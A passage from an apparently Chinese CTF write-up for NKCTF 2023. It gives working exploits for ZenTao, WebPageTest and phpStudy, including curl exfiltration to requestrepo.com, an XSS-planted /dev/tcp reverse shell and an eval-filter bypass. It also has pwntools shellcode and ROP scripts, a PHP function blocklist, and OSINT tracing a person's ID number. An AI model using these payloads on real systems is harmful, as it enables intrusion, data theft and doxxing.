class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不允许这些字符</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#(/\*)[\s\S]*(\*/)#i&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$content</span>);<br><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$cfg_disable_funs</span>;<br><span class="hljs-variable">$cfg_disable_funs</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$cfg_disable_funs</span>) ? <span class="hljs-variable">$cfg_disable_funs</span> : <span class="hljs-string">&#x27;phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,file_get_contents,highlight_file,fsockopen,fopen,fwrite,preg_replace&#x27;</span>;<br><span class="hljs-variable">$cfg_disable_funs</span> = <span class="hljs-variable">$cfg_disable_funs</span>.<span class="hljs-string">&#x27;,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert&#x27;</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$cfg_disable_funs</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$value</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$value</span>) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[^a-z]+[&#x27;\&quot;]*<span class="hljs-subst">&#123;$value&#125;</span>[&#x27;\&quot;]*[\s]*[([&#123;]#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#^[\s\S]+&lt;\?(php|=)?[\s]+#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[@][$][_0-9a-z]+[\s]*[(][\s\S]*[)]#iU&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[`][\s\S]*[`]#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用<code>scandir</code>列目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用<code>include</code>读文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;/f1Aggg&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_cms-1.png"></p><h2 id="webpagetest"><a href="#webpagetest" class="headerlink" title="webpagetest"></a>webpagetest</h2><p>webpagetest反序列化</p><p><a href="https://xz.aliyun.com/t/11798">AVD-2022-1474319</a></p><p>借助<code>phpggc</code>生成执行<code>cat /flag</code>命令的<code>phar</code>文件并发送</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">./phpggc Monolog/RCE2 system &#x27;cat /flag&#x27; -p phar -o testinfo.ini<br><br>URLENC_PAYLOAD=$(cat /root/phpggc/testinfo.ini | xxd -p | tr -d &quot;\n&quot; | sed &quot;s#..#%&amp;#g&quot;)<br><br>curl -sSkig &#x27;http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=gadget&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -<br><br>curl -sSkig &#x27;http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=phar:///var/www/html/results/gadget./testinfo.ini/foo&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/webpagetest-1.png"></p><h2 id="easy-pms"><a href="#easy-pms" class="headerlink" title="easy_pms"></a>easy_pms</h2><p>右键查看网页源代码得到版本为<code>18.0.beta1</code></p><p>github搜到<a href="https://github.com/webraybtl/zentaopms_poc/blob/main/poc_bypass_rce.py">poc</a></p><p>修改一下，加个回显，用<code>curl</code>外带到第三方平台<br><code>/flag</code>太长用<code>grep+base64</code>筛选</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-comment"># !/usr/bin/python</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">权限绕过+RCE POC 伪静态传参版</span><br><span class="hljs-string">禅道系统 影响版本 安全版本</span><br><span class="hljs-string">开源版 17.4以下的未知版本&lt;=version&lt;=18.0.beta1 18.0.beta2</span><br><span class="hljs-string">旗舰版 3.4以下的未知版本&lt;=version&lt;=4.0.beta1 4.0.beta2</span><br><span class="hljs-string">企业版 7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta2</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> requests<br><br>proxies = &#123;<br>    <span class="hljs-comment">#&quot;http&quot;: &quot;127.0.0.1:8080&quot;,</span><br>    <span class="hljs-comment">#&quot;https&quot;: &quot;127.0.0.1:8080&quot;,</span><br>&#125;<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-comment"># url=&quot;http://10.211.55.3:8008&quot;</span><br>    url1 = url+<span class="hljs-string">&#x27;/misc-captcha-user.html&#x27;</span><br>    <span class="hljs-comment"># url1 = url+&#x27;/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;#非伪静态版本按照此格式传参</span><br>    <span class="hljs-comment"># url2 = url+&#x27;/index.php?m=block&amp;f=printBlock&amp;id=1&amp;module=my&#x27;#可判断验证绕过的链接</span><br>    url3 = url + <span class="hljs-string">&#x27;repo-create.html&#x27;</span><br>    url4 = url + <span class="hljs-string">&#x27;repo-edit-10000-10000.html&#x27;</span><br>    headers=&#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>:<span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,<br>    &#125;<br><br>    headers2 = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        <span class="hljs-string">&quot;X-Requested-With&quot;</span>:<span class="hljs-string">&quot;XMLHttpRequest&quot;</span>,<br>        <span class="hljs-string">&quot;Referer&quot;</span>:url+<span class="hljs-string">&quot;/repo-edit-1-0.html&quot;</span><br>    &#125;<br><br>    data1 = <span class="hljs-string">&#x27;product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=&#x27;</span><br>    data2 = <span class="hljs-string">&#x27;SCM=Subversion&amp;client=`curl http://tmar9l37.requestrepo.com/?1=\\`cat /flag|grep NKCTF|base64\\``&#x27;</span><br>    s=requests.session()<br>    <span class="hljs-keyword">try</span>:<br>        req1 = s.get(url1,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers)<br>        req3 = s.post(url3,data=data1,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers2)<br>        req4 = s.post(url4,data=data2,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers2)<br>        <span class="hljs-built_in">print</span>(req4.text)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(check(<span class="hljs-string">&quot;http://9dab2a42-f651-4ef6-86a7-a356af0c7437.node2.yuzhian.com.cn/&quot;</span>))<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_pms-1.png"></p><h2 id="xiaopi"><a href="#xiaopi" class="headerlink" title="xiaopi"></a>xiaopi</h2><p>小皮存储型XSS-&gt;rce</p><p><a href="https://blog.csdn.net/weixin_46944519/article/details/128954060">参考文章</a></p><p>请求头加上<code>X-Requested-With: XMLHttpRequest</code>就能访问登录框</p><p>vps上放定时任务，反弹shell</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">poc</span>(<span class="hljs-params"></span>)&#123;<br>  $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=task_list&#x27;</span>,&#123;&#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>    <span class="hljs-keyword">var</span> id=data.<span class="hljs-property">data</span>[<span class="hljs-number">0</span>].<span class="hljs-property">ID</span>;<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=exec_task&#x27;</span>,&#123;<br>      <span class="hljs-attr">tid</span>:id<br>    &#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">res2</span>)&#123;<br>        $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/log.php?type=clearlog&#x27;</span>,&#123;<br><br>        &#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">res3</span>)&#123;&#125;,<span class="hljs-string">&quot;json&quot;</span>);<br><br><br>    &#125;,<span class="hljs-string">&quot;json&quot;</span>);<br>  &#125;,<span class="hljs-string">&quot;json&quot;</span>);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">save</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-keyword">var</span> data=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>  data.<span class="hljs-property">task_id</span>=<span class="hljs-string">&quot;&quot;</span>;<br>  data.<span class="hljs-property">title</span>=<span class="hljs-string">&quot;test&quot;</span>;<br>  data.<span class="hljs-property">exec_cycle</span>=<span class="hljs-string">&quot;1&quot;</span>;<br>  data.<span class="hljs-property">week</span>=<span class="hljs-string">&quot;1&quot;</span>;<br>  data.<span class="hljs-property">day</span>=<span class="hljs-string">&quot;3&quot;</span>;<br>  data.<span class="hljs-property">hour</span>=<span class="hljs-string">&quot;16&quot;</span>;<br>  data.<span class="hljs-property">minute</span> = <span class="hljs-string">&quot;35&quot;</span>;<br>  data.<span class="hljs-property">shell</span>=<span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/20.2.129.79/8888 0&gt;&amp;1&#x27;</span>;<br>  $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=save_shell&#x27;</span>,data,<span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>)&#123;<br>    <span class="hljs-title function_">poc</span>();<br>  &#125;,<span class="hljs-string">&#x27;json&#x27;</span>);<br>&#125;<br><span class="hljs-title function_">save</span>();<br></code></pre></td></tr></table></figure><p><code>python</code>开启一个<code>http</code>服务</p><p><code>python3 -m http.server 7777</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-2.png"></p><p>在登录处用户名框中插入<code>&lt;script src=http://20.2.129.79:7777/1.js&gt;&lt;/script&gt;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-1.png"></p><p>插入完后等待管理员bot登录，触发计划任务，反弹shell</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-3.png"></p><h2 id="hard-php"><a href="#hard-php" class="headerlink" title="hard_php"></a>hard_php</h2><p><strong>赛后复现</strong></p><p>ctfshow的题目加上一些函数禁用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// not only ++</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NKCTF&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$NK</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NKCTF&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$NK</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="hljs-variable">$NK</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$NK</span>) &lt; <span class="hljs-number">105</span>)&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$NK</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;hacker!!!&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>NKCTF=$_=(０/０)._;$_=$_[&#39;&#39;==&#39;$&#39;];$_++;$__=$_++;$__=$_++.$__;$_++;$_++;$_=&#39;_&#39;.$__.($_++).$_;$$_[__]($$_[_]);&amp;__=shell_exec&amp;_=echo `cat /flag`&gt;/var/www/html/3.txt</code></p><p>url编码后上传</p><h1 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h1><h2 id="Bridge"><a href="#Bridge" class="headerlink" title="Bridge"></a>Bridge</h2><p>百度识图得到关键信息<code>海口</code>，进新闻得到<code>世纪大桥</code>，在<code>世纪大桥</code>旁边有一个<code>世纪公园</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/Bridge-1.png"></p><p><code>NKCTF&#123;海南省海口市龙华区世纪公园&#125;</code></p><h2 id="两个人的夜晚"><a href="#两个人的夜晚" class="headerlink" title="两个人的夜晚"></a>两个人的夜晚</h2><p>根据图上的<code>NCC新城市中心</code>去百度地址</p><p><code>NKCTF&#123;天津市西青区中北镇万卉路3号NCC新城市中心&#125;</code></p><h2 id="狂飙"><a href="#狂飙" class="headerlink" title="狂飙"></a>狂飙</h2><p>抖音搜狂飙取景地得到<code>莲平路</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E7%8B%82%E9%A3%99-1.png"></p><p><code>NKCTF&#123;广东省江门市蓬江区莲平路&#125;</code></p><h2 id="real-social-engineering"><a href="#real-social-engineering" class="headerlink" title="real-social-engineering"></a>real-social-engineering</h2><p>github搜他id，找到博客地址：<a href="https://tacooo0o.github.io/">https://tacooo0o.github.io/</a></p><p>在<code>2021年终总结</code>这篇文章中找到驾驶证图片，包含了身份证信息</p><p><code>NKCTF&#123;6107**********4710&#125;</code></p><h2 id="Ferris-Wheel"><a href="#Ferris-Wheel" class="headerlink" title="Ferris_Wheel"></a>Ferris_Wheel</h2><p>百度识图得到<code>永川</code>，<code>摩天轮</code>，<code>渝西</code>等关键词</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/Ferris_Wheel-1.png"></p><p>百度地图找到渝西之眼，组合爆破下地名</p><p><code>NKCTF&#123;重庆市永川区兴龙湖CBD永川里奥特莱斯渝西之眼摩天轮&#125;</code></p><h2 id="旅程的开始"><a href="#旅程的开始" class="headerlink" title="旅程的开始"></a>旅程的开始</h2><p>百度地图搜<code>中铁酒店</code>，得到<code>贵阳火车站</code>，实景一点一点与图片对比</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E6%97%85%E7%A8%8B%E7%9A%84%E5%BC%80%E5%A7%8B-1.png"></p><p><code>NKCTF&#123;贵州省贵阳市南明区遵义路1号&#125;</code></p><h2 id="The-other-Bridge"><a href="#The-other-Bridge" class="headerlink" title="The other Bridge"></a>The other Bridge</h2><p>百度识图，得到<code>戴家巷崖壁步道</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/The%20other%20Bridge-1.png"></p><p>根据提示加个<code>畔</code></p><p><code>NKCTF&#123;重庆市江北区嘉陵江畔戴家巷崖壁步道&#125;</code></p><h2 id="decompile"><a href="#decompile" class="headerlink" title="decompile"></a>decompile</h2><p>步骤与上面的<code>decompile_revenge</code>一样</p><p><code>NKCTF&#123;N0w_you_kn0w_d3compl1te_bytecode&#125;</code></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node.yuzhian.com.cn:32220&quot;</span>)<br>shell=asm(shellcraft.sh()).rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;min!&#x27;</span>,shell)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="a-story-of-a-pwner"><a href="#a-story-of-a-pwner" class="headerlink" title="a_story_of_a_pwner"></a>a_story_of_a_pwner</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node.yuzhian.com.cn:36024&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;see this. &#x27;</span>)<br><br>d=<span class="hljs-built_in">int</span>(p.readline().decode().strip(),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br><br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><br>rdi=libc.address+<span class="hljs-number">0x0019764d</span><br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;comment?&#x27;</span>,p64(bin_sh))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;corment?&#x27;</span>,p64(rdi))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;corMenT?&#x27;</span>,p64(system))<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xa</span>+p64(<span class="hljs-number">0x405098</span>)+p64(<span class="hljs-number">0x401502</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ez-stack"><a href="#ez-stack" class="headerlink" title="ez_stack"></a>ez_stack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./ez_stack&#x27;</span>)<br>context.binary=e<br>ax_f=<span class="hljs-number">0x401146</span><br>syscall=<span class="hljs-number">0x40114e</span><br>bss=e.bss(<span class="hljs-number">0x400</span>)<br><br><span class="hljs-comment">#p=process(&#x27;./ez_stack&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn&#x27;</span>,<span 